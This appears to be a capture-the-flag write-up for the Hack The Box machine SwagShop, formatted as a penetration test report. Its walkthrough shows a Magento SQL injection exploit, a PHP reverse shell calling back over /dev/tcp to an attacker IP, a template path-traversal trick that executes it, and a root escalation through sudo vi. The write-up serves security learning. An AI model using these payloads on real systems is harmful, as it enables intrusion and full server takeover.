@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <!-- 
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+                -->
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div class="title-container">
+                    <img src="../images/icons/htb_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">SwagShop</h2>
+                </div>
+                
+                <img src="../images/Posts/SwagShop/SwagShop.png" alt="" class="right-machineimage"  style="margin-top: 20px;">
+
+                <ul class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                    <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                    <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                    <ul>
+                        <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                        <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                        <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                        <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                    </ul>
+                    <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                    <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                        <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                    </ul>
+                    <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                    <ul>
+                        <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                        <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                        <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                    </ul>
+                    <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                    <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                    <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>SwagShop WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/SwagShop/SwagShop_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h2>Table of Contents</h2>
+                        <ul>
+                            <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                            <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                            <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                            <ul>
+                                <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                                <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                                <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                                <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                            </ul>
+                            <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                            <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                                <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                            </ul>
+                            <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                            <ul>
+                                <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                                <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                                <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                            </ul>
+                            <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                            <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                            <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                        </ul>
+                    </div>
+
+                    <section id="Statement-of-Confidentiality">
+                        <h1>1. Statement of Confidentiality</h1>
+                        <p>The information contained in this document is confidential and exclusive to <strong>Swagshop</strong>. This report must not be used, duplicated or disclosed to third parties without the express consent of Timelapse. Any violation of this confidentiality may have legal consequences.</p>
+                    </section>
+                    
+                    <section id="Introduction">
+                        <h1>2. Introduction</h1>
+                        <p>The security assessment presented in this report was commissioned by <strong>Swagshop</strong>, with the aim of identifying vulnerabilities in its technological infrastructure and assessing the associated risks. The purpose of this test is to strengthen the security posture of the assessed systems by identifying and remediating weaknesses that can be exploited by an attacker.</p>
+                        <p>The analysis was conducted following an ethical and professional approach, simulating techniques and tactics used by malicious actors. The results obtained reflect a reproducible and meticulous assessment, highlighting critical points that require priority attention to ensure the confidentiality, integrity and availability of <strong>Swagshop</strong> digital assets.</p>
+                        <p>This assessment included a detailed analysis of the target called <strong>Swagshop</strong>, accessible via a VPN connection provided by the company. No initial authenticated access or additional information about the environment was provided, and a <strong>black-box</strong> approach was adopted to simulate a realistic external attack.</p>
+                    </section>
+
+                    <section id="Executive-Summary">
+                        <h1>3. Executive Summary</h1>
+                        <p><strong>Swagshop</strong> hired us to perform a security assessment and penetration testing on their internal network, with the aim of identifying vulnerabilities, assessing their impact, and validating the security mechanisms implemented. This report presents the significant findings in a clear and reproducible manner, along with detailed recommendations for remediation.</p>
+                    </section>
+                    
+                    <section id="Approach">
+                        <h2>3.1 Approach</h2>
+                        <p>The assessment was conducted using a "<strong>black box</strong>" approach between <strong>12/29/2024</strong> and <strong>12/30/2024</strong>, without any credentials or prior knowledge of <strong>Swagshop</strong>'s internal environment. The primary purpose was to identify potential unknown vulnerabilities.</p>
+                        <p>Testing was performed in a non-intrusive manner, using tools such as <strong>Nmap</strong> for enumeration, <strong>magescan</strong> for magento web enumeration. Misconfigurations and security weaknesses were searched for. The process was performed remotely from a host dedicated exclusively to this assessment. Each identified vulnerability was documented and examined manually to assess its exploitation potential and escalation possibilities. Findings were validated with reproducible testing.</p>
+                    </section>
+                    
+                    <section id="Scope">
+                        <h2>3.2 Scope:</h2>
+                        <p>The evaluation focuses on the <strong>Swagshop</strong> host only.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Host/URL/IP Adress</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>10.129.229.138</td>
+                                    <td>swagshop.htb</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 1: Scope Details</p>
+                    </section>
+ 
+                    <section id="Risk-Rating-Matrix">
+                        <h2>3.3 Risk Rating Matrix</h2>
+                        <p>The table below gives a key to the risk naming and colours used throughout this report to provide a clear and concise risk scoring system.</p>
+                        <p>It should be noted that quantifying the overall business risk posed by any of the issues found in any test is outside our scope. This means that some risks may be reported as high from a technical perspective but may, as a result of other controls unknown to us, be considered acceptable by the business.</p>
+                        <table id="Appendices-table">
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Risk Rating</th>
+                                    <th>CVSSv3 Score</th>
+                                    <th style="text-align: left;">Definition</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f1">1</td>
+                                    <td id="c2-f1">Critical</td>
+                                    <td id="c3-f1">9.0 - 10</td>
+                                    <td id="c4-f1">A vulnerability was discovered that has been rated as critical. This requires resolution as quickly as possible</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f2">2</td>
+                                    <td id="c2-f2">High</td>
+                                    <td id="c3-f2">7.0 - 8.9</td>
+                                    <td id="c4-f2">A vulnerability was discovered that has been rated as high. This requires resolution in a short term.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f3">3</td>
+                                    <td id="c2-f3">Medium</td>
+                                    <td id="c3-f3">4.0 -6.9</td>
+                                    <td id="c4-f3">A vulnerability was discovered that has been rated as medium. This should be resolved throughout the ongoing maintenance process</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f4">4</td>
+                                    <td id="c2-f4">low</td>
+                                    <td id="c3-f4">1.0 - 3.9</td>
+                                    <td id="c4-f4">A vulnerability was discovered that has been rated as low. This should be addressed as part of routine maintenance tasks.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f5">5</td>
+                                    <td id="c2-f5">Info</td>
+                                    <td id="c3-f5">0 - 0.9</td>
+                                    <td id="c4-f5">A discovery was made that is reported for information. This should be addressed in order to meet leading practice.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 2: Risk Rating Matrix</p>  
+                    </section>
+
+                    <section id="Assessment-Overview-and-Recommendations">
+                        <h2>3.4 Assessment Overview and Recommendations:</h2>
+                        <p>During the penetration test conducted against <strong>SwagShop</strong>, four critical vulnerabilities were identified that impact the <strong>confidentiality</strong>, <strong>integrity</strong>, and <strong>availability</strong> of the systems. The most relevant findings are summarized below:</p>
+                        <ul>
+                            <li><strong>SQLInjection - <span style="color: rgb(172, 0, 0);">Critical</span></strong>: The installed version of Magento is vulnerable to SQL Injection. This allows an attacker to manipulate SQL queries to create users with administrative privileges and thus completely compromise the website. It is recommended to upgrade to a secure version of <strong>Magento</strong> and implement validations and filtering on user input to prevent SQL Injections.</li>
+                            <li><strong>Remote Code Execution (RCE) - <span style="color: red;">High</span></strong>: In Magento, it was found that a user with administrative privileges can modify critical values ​​in the admin panel to then create a newsletter template, upload a malicious file and subsequently execute malicious code. It is advisable to implement strict validation and sanitization controls on file uploads, as well as restrict the use of templates with untrusted dynamic logic.</li>
+                            <li><strong>Insecure File Permissions - <span style="color: orange;">Medium</span></strong>: The `<strong>www-data</strong>` user has sudo permissions, which allow him to run the vi command on certain files. This facilitates privilege escalation to the `<strong>root</strong>` user, allowing full access to the system and compromising its confidentiality, integrity and availability. It is suggested to review and limit <strong>sudo</strong> permissions, as well as to ensure that users only have the privileges necessary to perform their functions.</li>
+                            <li><strong>Exposure of Sensitive Information - <span style="color: orange;">Medium</span></strong>: In Magento service, the <i>app/etc/local.xml</i> file is publicly accessible. This file stores database credentials in clear text, with this data an attacker can gain unauthorized access or exfiltration of sensitive data stored in the database. It is recommended to restrict access to sensitive directories using web server settings.</li>
+                            <li><strong>Directory Listing Enabled - <span style="color: orange;">Medium</span></strong>: Some directories such as <i>/shell/</i> and <i>/var/export/</i> allow their contents to be listed. This provides attackers with unnecessary information, such as sensitive files that could be used in later stages of exploitation. It is recommended to disable directory listing in the web server configuration, as well as to check file permissions and ensure that only necessary access is allowed.</li>
+                        </ul>
+                        <p><strong>General Impact</strong>: Exploitation of these vulnerabilities could allow an attacker to gain full system access, compromise sensitive data, and escalate privileges, potentially resulting in a significant security breach.</p>
+                        <p>It is recommended that <strong>SwagShop</strong> implement a number of corrective measures, starting with the highest risk. It is crucial to strengthen authentication and access controls, as well as review security configurations at the service and user level to mitigate potential exploits.</p>
+                    </section>
+
+                    <section id="Netwok-Penetration-Test-Assesment-Summary">
+                        <h1>4. Netwok Penetration Test Assesment Summary</h1>
+                        <p>All testing activities started from the perspective of an unauthenticated user on the network. <strong>SwagShop</strong> provided access to the network using a dedicated VPN, with no prior information about configurations or operating systems.</p>
+                    </section>
+                    
+                    <section id="Summary-of-Findings">
+                        <h2>Summary of Findings</h2>
+                        <p>During the course of testing, a total of four (<strong>5</strong>) findings were discovered that pose a material risk to <strong>SwagShop</strong>'s systems. The following table provides a summary of the findings by severity level.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th colspan="4">Finding Severity</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-level">
+                                    <td>Critical</td>
+                                    <td>High</td>
+                                    <td>Medium</td>
+                                    <td>Total</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-level-num">
+                                    <td id="darkRed">1</td>
+                                    <td id="red">1</td>
+                                    <td id="orange">3</td>
+                                    <td>5</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 3: Severity Summary</p>
+                        <p>Below is an overview of each finding identified during testing. These findings are discussed in depth in the <a href="#Technical-Findings-Details">Technical Findings Details</a> section of this report.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Finding #</th>
+                                    <th>Severity Level</th>
+                                    <th style="text-align: left;">Finding Name</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>1.</td>
+                                    <td id="darkRed">Critical</td>
+                                    <td style="text-align: left;">SQL Injection</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>2.</td>
+                                    <td id="red">High</td>
+                                    <td style="text-align: left;">Remote Code Execution (RCE)</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>3.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Insecure File Permissions</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>4.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Exposure of Sensitive Information</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>5.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Directory Listing Enabled</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 4: Finding List</p>
+                    </section>
+
+                    <section id="Summary-of-Impact">
+                        <h2>Summary of Impact</h2>
+                        <p>The identified findings represent a significant risk to the organization:</p>
+                        <div class="info-box">
+                            <ul>
+                                <li><strong>Confidentiality</strong>: Unauthorized access to sensitive information and administrative credentials.</li>
+                                <li><strong>Integrity</strong>: Potential unauthorized modifications to system configurations.</li>
+                                <li><strong>Availability</strong>: Exploits that could compromise the stability of critical services.</li>
+                            </ul>
+                        </div>
+                        <p>Exploitation of these vulnerabilities could allow a remote attacker to gain full access to the affected system, compromise sensitive information, and extend the attack to other network segments.</p>
+                    </section>
+
+                    <section id="Methodologies">
+                        <h1>5. Methodologies</h1>
+                        <p>The security assessment followed well-established and widely recognized methodologies in the cybersecurity industry. These methodologies ensured a systematic, reproducible approach, aligned with professional penetration testing standards.</p>
+                        <h2>Phases of Pentesting</h2>
+                        <ul style="list-style-type: decimal;">
+                            <li><strong>Reconnaissance</strong>: Collected public information and scanned target systems to identify exposed services and potential attack vectors.</li>
+                            <li><strong>Vulnerability Analysis</strong>: Detected misconfigurations, weak services, and other points of entry.</li>
+                            <li><strong>Exploitation</strong>: Tested identified vulnerabilities to gain unauthorized access and validate their impact.</li>
+                            <li><strong>Privilege Escalation</strong>: Investigated the environment to elevate privileges and evaluate potential risks at an administrative level.</li>
+                            <li><strong>Post-Exploitation and Remediation</strong>: Assessed the overall impact, extracted relevant information, and outlined mitigation strategies.</li>
+                        </ul>
+                        <h2>Standards and Tools</h2>
+                        <p><strong>References</strong>: OWASP Top 10, MITRE ATT&CK Framework, CWE (Common Weakness Enumeration).</p>
+                        <p><strong>Tools used</strong>: Nmap and magescan</p>
+                    </section>
+
+                    <section id="Internal-Network-Compromise-Walkthrough">
+                        <h1>6. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </section>
+                    
+                    <section id="Enumeration">
+                        <h2>6.1 Enumeration</h2>
+                        <h3>Nmap</h3>
+                        <p>We use the nmap tool to discover open ports on the target.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -n -v -Pn -p- 10.129.229.138                                                                                               
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 23:16 EST
+Initiating SYN Stealth Scan at 23:16
+Scanning 10.129.229.138 [65535 ports]
+Discovered open port 22/tcp on 10.129.229.138
+Discovered open port 80/tcp on 10.129.229.138
+Completed SYN Stealth Scan at 23:17, 14.00s elapsed (65535 total ports)
+Nmap scan report for 10.129.229.138
+Host is up (0.028s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds
+           Raw packets sent: 65565 (2.885MB) | Rcvd: 65536 (2.621MB)                               
+                            </pre>
+                        </div>
+                        <p>We found ports:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22/tcp</td>
+                                    <td>ssh</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80/tcp</td>
+                                    <td>http</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p>We use <strong>-sCV</strong> to detect service versions and run <strong>NSE</strong> scripts to detect potential vulnerabilities and misconfigurations.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -n -v -sCV -Pn -p 22,80 10.129.229.138        
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 23:20 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:20
+Scanning 10.129.229.138 [2 ports]
+Discovered open port 22/tcp on 10.129.229.138
+Discovered open port 80/tcp on 10.129.229.138
+Completed SYN Stealth Scan at 23:20, 0.04s elapsed (2 total ports)
+Initiating Service scan at 23:20
+Scanning 2 services on 10.129.229.138
+Completed Service scan at 23:20, 6.51s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.229.138.
+Initiating NSE at 23:20
+Completed NSE at 23:20, 1.91s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.15s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Nmap scan report for 10.129.229.138
+Host is up (0.028s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
+|_http-title: Did not follow redirect to http://swagshop.htb/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Initiating NSE at 23:20
+Completed NSE at 23:20, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
+           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
+                            </pre>
+                        </div>
+                        <p>From the scan performed with nmap we found:</p>
+                        <table style="width: 500px;">
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22</td>
+                                    <td>ssh</td>
+                                    <td>OpenSSH 7.6p1</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80</td>
+                                    <td>http</td>
+                                    <td>Apache/2.4.29</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>HTTP</h3>
+                        <p>From the nmap scan we found the domain "<strong>swagshop.htb</strong>". We added it to our <i>/etc/hosts</i> file</p>
+                        <div class="console-code">
+                            <pre>
+$ echo  10.129.229.138 swagshop.htb | sudo tee -a /etc/hosts
+                            </pre>
+                        </div>
+                        <p>Entering the website we find a page made with Magento.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/1.png" alt="">
+                        </div>
+                        <p>Using the <strong>magescan</strong> tool we list the version of magento that is being used. The result gives us version <strong>1.9.0.0</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/2.png" alt="">
+                        </div>
+                        <p>The magento output also shows us that we can list directories and read sensitive files:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/3.png" alt="">
+                        </div>
+                        <p>By going to the <i>app/etc/local.xml</i> path, we can read the file and find some possible clear text credentials from the local database:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/4.png" alt="">
+                        </div>
+                        <p>From the scan result we also found that it is vulnerable to directory listing.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/5.png" alt="">
+                        </div>
+                        <p>We check that we can list files by going to the paths: <strong>http://swagshop.htb/shell/</strong> & <strong>http://swagshop.htb/var/export/</strong></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/6.png" alt="">
+                            <img src="../images/Posts/SwagShop/7.png" alt="">
+                        </div>
+                    </section>
+                                                          
+                    <section id="Foothold">
+                        <h2>6.2 Foothold</h2>
+                        <p>Searching the web, we found <a href="https://www.exploit-db.com/exploits/37977" target="_blank">this</a> exploit where we read that Magento version 1.9.0.0 is vulnerable to SQLI <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1397" target="_blank">2015-1397</a>. By exploiting this vulnerability we can create a user with administrator privileges on the website.</p>
+                        <p>After modifying the script with our configuration, we managed to exploit the vulnerability and created the administrator user with credentials: `<strong>forme:forme</strong>`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/8.png" alt="">
+                        </div>
+                        <p>We enter the admin website and log in.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/9.png" alt="">
+                        </div>
+                        <p>Once we are inside with web administrator privileges, we will exploit a Magento web vulnerability to gain execution of arbitrary commands. For this, we can use <a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper" target="_blank">this</a> blog as a guide.</p>
+                        <p>First we have to activate the developer function "<strong>Allow Symlinks</strong>" by going to the path <strong>System > configuration > Advanced > Developer</strong>, check the allow box to "<strong>yes</strong>" and save Config.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/10.png" alt="">
+                            <img src="../images/Posts/SwagShop/11.png" alt="">
+                        </div>
+                        <p>We create the file <strong>test.php.png</strong> with the reverse shell:</p>
+                        <div class="console-code">
+                            <pre>
+$ cat test.php.png
+
+&lt;?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'")?>
+                            </pre>
+                        </div>
+                        <p>Back on the web page, go to <strong>Catalog > Manage Categories</strong>, create a <strong>new category</strong> named test, upload the reverse shell created earlier in the <strong>image</strong> field and save the changes.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/12.png" alt="">
+                            <img src="../images/Posts/SwagShop/13.png" alt="">
+                            <img src="../images/Posts/SwagShop/14.png" alt="">
+                        </div>
+                        <p>Once the category is created, go to <strong>NewsLetter > NewsLetter Template</strong> and <strong>add a New Template</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/15.png" alt="">
+                        </div>
+                        <p>We listen on port 4444 with netcat on our machine.</p>
+                        <p>With put this on the description `<strong>{{block type="core/template" template="../../../../../../media/catalog/category/test.php.png"}}</strong>` and we will call our malicious file to later execute it. We <strong>save the Template</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/16.png" alt="">
+                        </div>
+                        <p>We go to review our template by clicking on it.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/17.png" alt="">
+                        </div>
+                        <p>Click on `<strong>preview template</strong>`, our reverse shell is executed and we gain access as the user <strong>www-data</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/18.png" alt="">
+                            <img src="../images/Posts/SwagShop/19.png" alt="">
+                        </div>
+                    </section>
+                    
+                    <section id="Privilege-Escalation">
+                        <h2>6.3 Privilege Escalation</h2>
+                        <p>Checking the sudo permissions of the <strong>www-data</strong> user we notice that he can use the <strong>/usr/bin/vi</strong> command on any file in the <i>/var/www/html/</i> path. With these privileges we can easily escalate our privileges and start a shell as root.</p>
+                        <div class="console-code">
+                            <pre>
+www-data@swagshop:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+www-data@swagshop:/var/www/html$ 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/20.png" alt="">
+                            <img src="../images/Posts/SwagShop/21.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/cron.php --cmd sh  
+
+root@swagshop:/var/www/html# id && ifconfig
+uid=0(root) gid=0(root) groups=0(root)
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.229.138  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 dead:beef::250:56ff:fe94:bff1  prefixlen 64  scopeid 0x0&lt;global>
+        inet6 fe80::250:56ff:fe94:bff1  prefixlen 64  scopeid 0x20&lt;link>
